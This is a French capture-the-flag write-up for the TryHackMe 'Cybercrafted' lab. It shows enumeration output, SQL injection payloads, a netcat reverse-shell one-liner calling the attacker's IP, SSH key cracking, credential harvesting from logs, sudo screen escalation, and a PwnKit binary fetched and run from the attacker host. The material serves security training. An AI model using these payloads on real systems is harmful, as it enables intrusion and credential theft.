# Cybercrafted !
Visiblement un serveur Minecraft P2W qu'il faut casser !

# Enum
Sur le site, dans les commentaires il parle de subdomain. On donc enum ca aussi !
```
<!--A Note to the developers: Just finished up adding other subdomains, now you can work on them!-->
```
## NMAP
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-04 08:05 EST
Nmap scan report for 10.10.204.109
Host is up (0.037s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Apache/2.4.29 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.78 seconds

```
## Subdomains :
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://cybercrafted.thm
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.cybercrafted.thm Status: 200 [Size: 937]
Found: store.cybercrafted.thm Status: 403 [Size: 287]
Found: www.admin.cybercrafted.thm Status: 200 [Size: 937]
Found: www.store.cybercrafted.thm Status: 403 [Size: 291]
Found: gc._msdcs.cybercrafted.thm Status: 400 [Size: 301]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```
## Gobuster sur cybercrafted.thm:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 321] [--> http://cybercrafted.thm/assets/]
/secret               (Status: 301) [Size: 321] [--> http://cybercrafted.thm/secret/]
/server-status        (Status: 403) [Size: 281]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
## Gobuster sur admin.cybercrafted.thm
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 333] [--> http://admin.cybercrafted.thm/assets/]
/server-status        (Status: 403) [Size: 287]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
## Gobuster sur store.cybercrafted.thm
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 333] [--> http://admin.cybercrafted.thm/assets/]
/server-status        (Status: 403) [Size: 287]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
## Dirsearch
Je n'ai rien trouver de bien foufou avec Gobuster, mais j'ai trouver avec Dirsearch !
```
[09:32:39] Starting:                                                                                                                                                                   
[09:33:29] 200 -    2KB - /assets/                                          
[09:33:29] 301 -  333B  - /assets  ->  http://store.cybercrafted.thm/assets/
[09:34:43] 200 -  838B  - /search.php                                       
                                                                             
Task Completed
```
# SQLi !
On va jouer un peu avec SQLmap ici.
On va récupèrer la requête avec Burp Suite et lancer sqlmap
```
sqlmap -r req.txt
```
Il trouve bien une injection SQL :
```
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=test' AND (SELECT 8937 FROM (SELECT(SLEEP(5)))nsuO) AND 'Jxkt'='Jxkt&submit=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: search=test' UNION ALL SELECT NULL,NULL,CONCAT(0x71787a6b71,0x42614b77684c51694857556153465a54556c6b666155707a5a486b49764a73664964725a5578447a,0x716b786b71),NULL-- -&submit=
```
Dans la database **webapp** on retrouve le flag et l'user :
```
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 88bXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX1 | xXUltimateCreeperXx |
| 4  | THM{bXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX8}    | web_flag            |
+----+------------------------------------------+---------------------+
```
Le mot de passe est en SHA1.

```
xXUltimateCreeperXx
dXXXXXXXXXXXXXXX9
```
# Admin panel & RCE!
Nous avons désormais l'accès a l'admin panel. Celui-ci propose une page qui execute des commandes sur le serveur.
En injectant le payload suivant :
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.14.59.209 1234 >/tmp/f
```
On récupère un revshell.

# Privesc to xxultimatecreeperxx !
Sur le serveur on trouve 2 users, **xxultimatecreeperxx** et **cybercrafted**

On retrouve une clé SSH dans le dossier /home/xxultimatecreeperxx/.ssh
```id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
XXXXXXXXXXXXXXX
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----
```
On va la crack avec John
## Cracking the fking key !
On va d'abord la rendre lisible par John:
```
ssh2john id_rsa > hash.txt
```
Puis la crack
```
john --wordlist=/home/kali/Wordlist/rockyou.txt hash.txt
```
Et voici le résultat :
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cXXXXXXXXXXXXXXX6      (id_rsa)     
1g 0:00:00:00 DONE (2023-12-04 10:05) 2.173g/s 4121Kp/s 4121Kc/s 4121KC/s creepygoblin..creek93
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Nous avons donc le mot de passe de la clé ssh: **cXXXXXXXXXXXXXXX6**
```
root@kali: ssh -i id_rsa xxultimatecreeperxx@10.10.218.242
Enter passphrase for key 'id_rsa': 
xxultimatecreeperxx@cybercrafted:~$ 
```
# Lateral Mouvement:
En regardant dans les tâches cron on vois qu'un script s'execute :
```
* *     1 * *   cybercrafted tar -zcf /opt/minecraft/WorldBackup/world.tgz /opt/minecraft/cybercrafted/world/*
```
Dans le dossier **/opt/minecraft** on retrouve une note :
```
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.
```
Le flag:
```
THM{bXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXe}
```
## Le plugin !
On retrouve donc le plugin LoginSystem, en farfouillant dedans on retrouve cela :
```
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml 
cybercrafted: dcbXXXXXXXXXXXXXXXXXXXX9e
madrinch: 42f7XXXXXXXXXXXXXXXXXXXXXXXX4cafcb
```
Mais aussi, et surtout, les logs !
```
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt
[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:25:16] cybercrafted registered. PW: JXXXXXXXXXXXXXk
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:47:34] cybercrafted logged in. PW: JXXXXXXXXXXXXXXk
```

On retrouve ici le compte de **cybercrafted** !
# Privesc to root !
On regarde les droits de **cybercrafted**
```
cybercrafted@cybercrafted:~$ sudo -l
[sudo] password for cybercrafted: 
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
```
On vois ici qu'il peux utiliser **screen** en tant que root.
```
cybercrafted@cybercrafted:~$ sudo /usr/bin/screen -r cybercrafted
```
Ensuite, nous devons utilisez les raccourcis **CTRL+A** afin d'avoir le shell:
```
# id
uid=0(root) gid=1002(cybercrafted) groups=1002(cybercrafted)
```
Le flag ce trouve dans **/root/root.txt**

# CHEAT MOD
Décidement, cette vulnérabilité je l'aime d'amour, elle fonctionne partout !!
```
www-data@cybercrafted:/tmp$ wget 10.14.59.209/PwnKit
--2023-12-04 15:26:47--  http://10.14.59.209/PwnKit
Connecting to 10.14.59.209:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: 'PwnKit'

PwnKit              100%[===================>]  17.62K  --.-KB/s    in 0.03s   

2023-12-04 15:26:47 (536 KB/s) - 'PwnKit' saved [18040/18040]

www-data@cybercrafted:/tmp$ chmod +x PwnKit 
www-data@cybercrafted:/tmp$ ./PwnKit 
root@cybercrafted:/tmp# 
```
